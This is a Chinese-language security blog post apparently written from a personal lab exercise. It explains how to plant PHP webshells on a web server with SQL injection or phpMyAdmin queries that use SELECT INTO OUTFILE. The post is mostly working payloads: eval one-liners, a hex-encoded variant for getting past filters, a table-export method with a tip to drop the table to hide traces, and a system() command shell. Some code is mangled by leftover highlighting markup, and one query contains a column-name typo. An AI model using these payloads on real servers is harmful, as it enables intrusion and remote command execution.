---
title: Webshell（一）通过phmyadmin导出一句话
tags:
  - Webshell
id: 70
categories:
  - Webshell
date: 2016-07-28 10:21:42
---

<header class="entry-header">

# [Webshell（一）通过phmyadmin导出一句话](http://blog.blbana.cc/blog/Webshell%25EF%25BC%2588%25E4%25B8%2580%25EF%25BC%2589%25E9%2580%259A%25E8%25BF%2587phpmyadmin%25E5%25AF%25BC%25E5%2587%25BA%25E4%25B8%2580%25E5%258F%25A5%25E8%25AF%259D.html)

</header>
<div class="entry-content">

## 导语

> 今天无意中看见了一篇有关进入phpmyadmin中执行SQL语句写马的文章，自己搭好环境练习了一下

<!--more-->
### 正文

我们最常用的方法就是利用**SQL注入**构造出能够写shell的语句，通常都是这一句：

    SELECT '<span class="php"><span class="hljs-preprocessor">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'passwd'</span>]);<span class="hljs-preprocessor">?&gt;</span></span>' INTO OUTFILE 'C：/wamp/www/1.hack'`</pre>
    执行完语句之后，我们发现shell已经被写在了对应目录写的文件里

    ![image](http://123.206.79.232/img/Webshell1.jpg)

    有时候我们发现自己的shell并没有编写成功，这有可能是我们的shell被过滤掉了，我们可以考虑将shell转成十六进制的编码，再次尝试写马
    <pre>`<span class="hljs-operator"><span class="hljs-keyword">SELECT</span> <span class="hljs-number">0x3c3f70687020406576616c28245f504f53545b2768656c6c275d293b3f3e</span> <span class="hljs-keyword">INTO</span> <span class="hljs-keyword">OUTFILE</span> <span class="hljs-string">'C:/wamp/www/1.hack'</span></span>`</pre>
    这时我们可能绕过了过滤成功写马

    可能进行了十六进制的编码我们依然无法成功写马，今天我又看见了下面的几种通过phpmyadmin写马的方式，但让前提是我们要进入 **数据库**的**phpmyadmin**

    #### 1.我们可以现在数据库的**mysql数据库**中建立一个表shell,表中有字段shell1

    `CREATE TABLE shell(shell1 TEXT NOT NULL);`

    建好后给字段shell1输入values值 ，也就是shell

    `INSERT INTO shell(shell1) VALUES('&lt;?php @eval($_POST[pass])?&gt;');`

    写好这个字段以后，通过以下SQL语句将shell导出数据库
    <pre>`<span class="hljs-operator"><span class="hljs-keyword">SELECT</span> she111 <span class="hljs-keyword">from</span> shell <span class="hljs-keyword">INTO</span> <span class="hljs-keyword">OUTFILE</span> <span class="hljs-string">'c:/wamp/www/1.hack'</span>;</span>`</pre>
    执行完以上操纵以后，记得删除表哟 **哇哈哈哈哈**

    `DROP TABLE IF EXISTS 'shell';`

    #### 2.我们还可以写入PHP函数**system()**来执行系统命令

    <pre>`SELECT '<span class="php"><span class="hljs-preprocessor">&lt;?PHP</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;pre&gt;'</span>;system(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'cmd'</span>])<span class="hljs-preprocessor">?&gt;</span></span>;echo '<span class="hljs-tag">&lt;/<span class="hljs-title">pre</span>&gt;</span>'';

> 标签
> 
> <pre></pre>
> 
> 目的是让返回的结果，保持原有的换行等操作，方便我们的查看
![image](http://123.206.79.232/img/Webshell.jpg)

之后我们就可以通过shell执行系统指令了，如下图

![image](http://123.206.79.232/img/webshell2.jpg)

这次先总结这么多的写shell的方法，以后发现新的了还会继续~~

</div>